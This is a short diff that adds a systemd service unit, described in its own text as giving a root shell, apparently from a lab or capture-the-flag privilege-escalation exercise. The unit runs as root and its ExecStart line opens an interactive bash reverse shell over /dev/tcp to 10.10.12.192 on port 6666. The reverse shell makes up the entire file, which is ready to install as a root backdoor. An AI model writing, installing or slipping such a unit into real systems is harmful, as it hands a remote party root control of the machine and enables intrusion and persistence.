@@ -1,0 +1,11 @@
+[Unit]
+Description=gives root shell
+
+[Service]
+RemainAfterExit=yes
+Type=simple
+User=root
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.12.192/6666 0>&1"
+
+[Install]
+WantedBy=default.target
